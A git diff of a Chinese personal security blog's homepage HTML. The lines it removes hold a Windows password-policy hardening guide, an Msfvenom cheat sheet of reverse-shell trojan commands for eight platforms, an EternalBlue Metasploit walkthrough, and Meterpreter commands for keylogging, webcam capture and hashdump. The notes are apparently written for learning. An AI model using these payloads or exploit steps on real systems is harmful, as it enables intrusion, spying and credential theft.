@@ -1,1217 +1,338 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="花有重开日，人无再少年。">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Pokerface - 记录学习过程和一些笔记</title><meta name="author" content="Pokerface"><meta name="copyright" content="Pokerface"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="花有重开日，人无再少年。">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Pokerface博客">
+<meta property="og:title" content="Pokerface">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Pokerface博客">
+<meta property="og:site_name" content="Pokerface">
 <meta property="og:description" content="花有重开日，人无再少年。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Pictrue.jpg">
 <meta property="article:author" content="Pokerface">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://example.com/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>Pokerface博客</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
+<meta name="twitter:image" content="http://example.com/img/Pictrue.jpg"><link rel="shortcut icon" href="/img/%E7%BC%85%E5%9B%A0%E7%8C%AB.svg"><link rel="canonical" href="http://example.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pokerface',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-12-15 15:13:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
   }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Pokerface博客</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">记录学习过程和一些笔记</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result">
-  <div id="no-result">
-    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/18/iptables/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/18/iptables/" class="post-title-link" itemprop="url">iptables</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-18 08:13:25" itemprop="dateCreated datePublished" datetime="2021-11-18T08:13:25+08:00">2021-11-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">密码策略配置</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-17 10:13:49" itemprop="dateCreated datePublished" datetime="2021-11-17T10:13:49+08:00">2021-11-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-18 08:17:02" itemprop="dateModified" datetime="2021-11-18T08:17:02+08:00">2021-11-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">密码策略</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="密码策略配置"><a href="#密码策略配置" class="headerlink" title="密码策略配置"></a>密码策略配置</h3><p><strong>Windows下的密码配置</strong></p>
-<p>​    <strong>前提：一些windows版本没有组策略，需要自行配置，复制下方内容到txt文本，后缀改为bat或cmd运行即可</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off
-
-<span class="token function">pushd</span> <span class="token string">"%~dp0"</span>
-
-<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum <span class="token operator">></span>List.txt
-
-<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum <span class="token operator">>></span>List.txt
-
-<span class="token keyword">for</span> /f %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'findstr /i . List.txt 2^>nul'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> dism /online /norestart /add-package:<span class="token string">"C:\Windows\servicing\Packages\%%i"</span>
-
-pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol>
-<li><p>配置密码复杂性，密码最长使用期限，密码长度最小值不小于八位</p>
-<ul>
-<li>（Win+R输入 gpedit.msc）</li>
-<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略-&gt;设置1、密码必须符合复杂性要求（启用），2、密码长度最小值（不小于八位），3、密码最长使用期限</li>
-<li><img src="/images/w1.png"></li>
-<li><img src="/images/w2.jpg"></li>
-<li><img src="/images/w3.png"></li>
-</ul>
-</li>
-<li><p>配置windows登录，五次登录之后，自动锁定账户一分钟</p>
-<ul>
-<li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;账户锁定策略-&gt;1、设置账户锁定阈值（五次）2、账户锁定时间（一分钟）</li>
-<li><img src="/images/w4.png"></li>
-<li><img src="/images/w5.png"></li>
-</ul>
-</li>
-<li><p>设置windows试图登录的用户提示的消息文本内容为For authorized users only</p>
-<ul>
-<li>Windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;交互式登录：试图登录的用户的消息文本</li>
-<li><img src="/images/w6.png"></li>
-</ul>
-</li>
-<li><p>设置windows远程时用户非活动会话链接应小于等于五分钟</p>
-<ul>
-<li>用户配置-&gt;管理面板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;会话时间限制-&gt;设置活动但空闲的远程桌面服务会话的时间限制（启用并设置五分钟）</li>
-<li><img src="/images/w7.jpg"></li>
-</ul>
-</li>
-<li><p>对windows服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听</p>
-<ul>
-<li>计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;安全-&gt;设置</li>
-<li>远程（RDP）连接要求使用指定的安全层（SSL）</li>
-<li>要求安全的RPC通信</li>
-<li>设置客户端连接加密级别（高级别）</li>
-<li><img src="/images/w8.png"></li>
-<li><img src="/images/w9.png"></li>
-<li><img src="/images/w10.png"></li>
-</ul>
-</li>
-<li><p>普通用户进行最小权限管理，对关闭系统仅限超级管理员帐号</p>
-<ul>
-<li>计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;关闭系统（除administrators外的用户删除）</li>
-<li><img src="/images/w11.png"></li>
-</ul>
-</li>
-<li><p>查找并删除主机可能存在的hacker用户</p>
-<ul>
-<li><img src="/images/w12.png"></li>
-</ul>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/15/Msfvenom/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/15/Msfvenom/" class="post-title-link" itemprop="url">Msfvenom</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-15 11:25:23 / 修改时间：22:15:55" itemprop="dateCreated datePublished" datetime="2021-11-15T11:25:23+08:00">2021-11-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p>
-<p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p>
-<p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p>
-<p>选项：</p>
-<p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p>
-<p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</p>
-<p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</p>
-<p>-f、 –format<format>输出格式（使用–list要列出的格式）</p>
-<p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p>
-<p>–服务名称<value>生成服务二进制文件时要使用的服务名称</p>
-<p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</p>
-<p>–使用所有可用编码器生成尽可能最小的有效负载</p>
-<p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</p>
-<p>–加密密钥<value>用于–encrypt的密钥</p>
-<p>–encrypt iv<value>的初始化向量–encrypt</p>
-<p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</p>
-<p>–平台<platform>platform for–payload（使用–list要列出的平台）</p>
-<p>-o、 –out<path>将有效负载保存到文件</p>
-<p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</p>
-<p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</p>
-<p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</p>
-<p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p>
-<p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p>
-<p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p>
-<p>-c、 –添加代码<path>指定要包含的其他win32外壳代码文件</p>
-<p>-x、 –template<path>指定要用作模板的自定义可执行文件</p>
-<p>-k、 –保留–template行为并将有效负载作为新线程注入</p>
-<p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p>
-<p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p>
-<p>常用木马：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:
-格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Liunx：
-格式：msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>PORT<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP：
-格式：msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ASP：
-格式：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">JSP：
-格式：msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f raw &gt; shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Python：
-格式：msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Bash：
-格式：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Perl：
-格式：msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/15/Msfconsole/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/15/Msfconsole/" class="post-title-link" itemprop="url">Msfconsole</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-15 08:55:36" itemprop="dateCreated datePublished" datetime="2021-11-15T08:55:36+08:00">2021-11-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-16 08:58:15" itemprop="dateModified" datetime="2021-11-16T08:58:15+08:00">2021-11-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><p><strong>Msfconsole初始化参数：</strong></p>
-<p>-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”</p>
-<p>-M、 –迁移路径目录指定包含其他数据库迁移的目录</p>
-<p>-n、 –无数据库禁用数据库支持</p>
-<p>-y、 –yaml PATH指定包含数据库设置的yaml文件</p>
-<p>-c文件加载指定的配置文件</p>
-<p>-v、 -v，–version显示版本</p>
-<p>–defer-module-loads –延迟模块加载延迟模块加载，除非明确要求</p>
-<p>-m、 –模块路径目录加载其他模块路径</p>
-<p>-a、 –退出Metasploit前询问或接受“退出-y”</p>
-<p>-H、 –历史记录文件将命令历史记录保存到指定文件</p>
-<p>-l、 –记录器字符串指定要使用的记录器（Flatfile、StdoutWithoutTimestamps、Stderr、Stdout</p>
-<p>z`TimestampColorlessFlatfile）</p>
-<p>-L,   –real readline使用系统readline库而不是RbReadline</p>
-<p>-o、 –输出文件输出到指定的文件</p>
-<p>-p、 –插件启动时加载插件</p>
-<p>-q、 –启动时不要打印横幅</p>
-<p>-r、 –资源文件执行指定的资源文件（-for stdin）</p>
-<p>-x、 –执行命令执行指定的控制台命令（使用；多个）</p>
-<p><strong>Msfconsole启动后参数：</strong></p>
-<p>advanced      高级显示一个或多个模块的高级选项</p>
-<p>back              后退从当前上下文向后移动</p>
-<p>clearm           clearm清除模块堆栈</p>
-<p>favorite          收藏夹将模块添加到收藏夹模块列表中</p>
-<p>info                信息显示有关一个或多个模块的信息</p>
-<p>listm               列出模块堆栈</p>
-<p>loadpath         从路径中搜索并加载模块</p>
-<p>options           选项显示一个或多个模块的全局选项或</p>
-<p>popm             将最新模块从堆栈中弹出并使其处于活动状态</p>
-<p>previous        将以前加载的模块设置为当前模块</p>
-<p>pushm           将活动或模块列表推送到模块堆栈上</p>
-<p>reload_all      重新加载\u all从所有定义的模块路径重新加载所有模块</p>
-<p>search          搜索模块名称和描述</p>
-<p>show            显示显示给定类型的模块或所有模块</p>
-<p>use               使用“按名称或搜索词/索引与模块交互”</p>
-<p><strong>常用模块解释：</strong></p>
-<p>search 搜索列举相关模块</p>
-<p><img src="/images/msfc1.png"></p>
-<p>use 选择相关模块</p>
-<p><img src="/images/msfc2.png"></p>
-<p>show options 显示模块的相关参数</p>
-<p><img src="/images/msfc3.png"></p>
-<p>back 退出当前模块</p>
-<p><img src="/images/msfc4.png"></p>
-<p>set 用来设置选择模块后的载荷</p>
-<p><img src="/images/msfc5.png"></p>
-<p>run和exploit运行当前模块</p>
-<p><img src="/images/msfc6.png"></p>
-<p><strong>利用永恒之蓝进行简单的一次渗透：</strong></p>
-<p>启动软件：</p>
-<p><img src="/images/msfc7.png"></p>
-<p>搜索Ms17_010模块并选择：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：search 
-格式：use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/images/msfc9.png"></p>
-<p>列出当前选择模块的可用内容：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/msfc8.png"></p>
-<p>利用set设置上面显示内容的RHOSTS 指定要攻击的电脑IP</p>
-<p><img src="/images/msfc10.png"></p>
-<p>输入run或exploit运行当前模块，拿到控制台</p>
-<p><img src="/images/msfc11.png"></p>
-<p><img src="/images/msfc12.png"></p>
-<p><strong>Meterpreter命令：</strong></p>
-<p>cat /路径/ 查看文件内容</p>
-<p>del /路径/ 删除指定内容</p>
-<p>upload /路径/ 上传文件到目标主机</p>
-<p>download /路径/ 下载目标主机文件到本地主机</p>
-<p>pwd 查看当前所在路径</p>
-<p>mv 修改目标主机上的文件名</p>
-<p>keyscan_start 开启键盘记录功能</p>
-<p>keyscan_dump 显示捕捉到的键盘记录信息</p>
-<p>keyscan_stop 停止键盘记录功能</p>
-<p>reboot 重启目标主机</p>
-<p>shell 拿到cmd</p>
-<p>sysinfo 查看目标主机信息</p>
-<p>hashdump 获取目标主机用户名的hash值</p>
-<p>vnc 远程桌面</p>
-<p>record_mic 音频录制</p>
-<p>webcam_chat 查看摄像头接口</p>
-<p>webcam_list 查看摄像头列表</p>
-<p>webcam_stream 摄像头获取</p>
-<p>keylogrecorder 记录键盘信息</p>
-<p>run post/windows/manage/enable_rdp 开启目标远程3389</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
